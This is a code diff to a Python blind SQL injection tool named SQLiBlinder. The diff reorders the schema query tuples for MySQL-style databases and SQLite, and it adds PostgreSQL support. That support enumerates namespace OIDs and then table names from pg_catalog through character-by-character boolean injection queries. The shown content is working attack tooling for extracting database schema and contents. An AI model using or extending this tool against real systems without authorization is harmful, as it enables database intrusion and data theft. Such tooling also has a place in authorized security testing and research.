@@ -25,8 +25,8 @@ class SQLiBlinder:
 			self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
 			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
 			self.offset_shift=0
-			self.tables_query = ['information_schema.tables','table_name',"table_schema <> 'information_schema'"]
-			self.columns_query = ['information_schema.columns','column_name',"table_name = '{table_name}'"]
+			self.tables_query = ['table_name','information_schema.tables',"table_schema <> 'information_schema'"]
+			self.columns_query = ['column_name','information_schema.columns',"table_name = '{table_name}'"]
 
 		#MSSQL
 		if dbms == 'mssql':
@@ -45,7 +45,7 @@ class SQLiBlinder:
 			self.string_char_definition = 'SELECT hex(SUBSTR(%s,%d,1))'
 			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
 			self.offset_shift=0
-			self.tables_query = ['sqlite_master','sql',None]
+			self.tables_query = ['sql','sqlite_master',None]
 
 		#oracle
 		if dbms == 'oracle':
@@ -64,6 +64,8 @@ class SQLiBlinder:
 			self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
 			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
 			self.offset_shift=0
+			self.oid_query = ["cast(oid as text)","pg_catalog.pg_namespace","nspname not in ('pg_catalog', 'pg_toast')"]
+			self.tables_query = ['relname','pg_catalog.pg_class',"relnamespace in (%s) AND relkind IN ('r','') AND pg_catalog.pg_table_is_visible(oid)"]
 
 	def check(self):
 		if self.request_func('1=1') == True:
@@ -206,8 +208,17 @@ class SQLiBlinder:
 			return 'dbms not supported'
 
 	def get_tables(self):
+		if self.dbms == 'postgre':
+			column,table,where = self.oid_query
+			oids = self.get([column],table,where=where)
+			oids = [x[0] for x in oids]
+			print ('oids: ', oids)
+
+			column,table,where = self.tables_query
+			where = where %(','.join(oids))
+			return self.get([column],table,where=where)
 		if hasattr(self,'tables_query'):
-			table,column,where = self.tables_query
+			column,table,where = self.tables_query
 
 			return self.get([column],table,where=where)
 		else:
